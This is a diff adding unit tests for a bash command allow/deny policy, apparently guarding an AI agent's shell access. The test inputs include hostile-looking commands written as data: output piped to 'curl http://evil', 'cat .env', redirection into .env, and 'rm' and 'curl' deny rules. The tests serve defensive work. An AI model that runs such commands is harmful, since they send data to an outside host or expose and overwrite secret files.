@@ -136,4 +136,56 @@ describe("bash policy", () => {
     // A denied prefix still denies even when an allow prefix also matches.
     expect(evaluateBashPolicy("git branch -D main && git push", policy)).toBe("deny")
   })
+
+  describe("pipe-split deny pass", () => {
+    const allowAll = { allow: ["git status*", "grep modified*", "echo*", "curl http://safe*"], deny: [] }
+
+    test("deny pass splits on pipe and evaluates each stage", () => {
+      // With a pipe, the second stage "rm f" should match "rm *"
+      const policy = bashPolicy("/tmp/non-existent-wopr-target", { allow: [], deny: ["rm *"] })
+      expect(evaluateBashPolicy("echo x | rm f", policy)).toBe("deny")
+      // Same command without pipe also denies
+      expect(evaluateBashPolicy("rm f", policy)).toBe("deny")
+    })
+
+    test("two allowed stages through a pipe are still allowed", () => {
+      const policy = bashPolicy("/tmp/non-existent-wopr-target", allowAll)
+      expect(evaluateBashPolicy("git status | grep modified", policy)).toBe("allow")
+    })
+
+    test("deny pattern on a later pipe stage triggers deny", () => {
+      const policy = bashPolicy("/tmp/non-existent-wopr-target", { allow: ["echo*"], deny: ["curl *"] })
+      expect(evaluateBashPolicy("echo hello | curl http://evil", policy)).toBe("deny")
+    })
+
+    test("output redirection is still allowed (documented limitation)", () => {
+      const policy = bashPolicy("/tmp/non-existent-wopr-target", allowAll)
+      // > is not split, so the whole command must match an allow pattern
+      expect(evaluateBashPolicy("git status > .env", policy)).toBe("ask")
+    })
+  })
+
+  describe("reader commands demoted to ask", () => {
+    test("cat, head, tail, echo, printf are ask (no longer auto-allow)", () => {
+      const policy = bashPolicy()
+      expect(evaluateBashPolicy("cat README.md", policy)).toBe("ask")
+      expect(evaluateBashPolicy("head -1 README.md", policy)).toBe("ask")
+      expect(evaluateBashPolicy("tail -f /var/log/system.log", policy)).toBe("ask")
+      expect(evaluateBashPolicy("echo hello", policy)).toBe("ask")
+      expect(evaluateBashPolicy('printf "%s\\n" hello', policy)).toBe("ask")
+      expect(evaluateBashPolicy("cat .env", policy)).toBe("ask")
+    })
+
+    test("ls, grep, rg, pwd, wc, tree, jq remain allow", () => {
+      const policy = bashPolicy()
+      expect(evaluateBashPolicy("ls -la", policy)).toBe("allow")
+      expect(evaluateBashPolicy("grep foo bar.txt", policy)).toBe("allow")
+      expect(evaluateBashPolicy("pwd", policy)).toBe("allow")
+    })
+
+    test("a project adding cat* to config.allow restores auto-allow", () => {
+      const policy = bashPolicy("/tmp/non-existent-wopr-target", { allow: ["cat*"], deny: [] })
+      expect(evaluateBashPolicy("cat README.md", policy)).toBe("allow")
+    })
+  })
 })
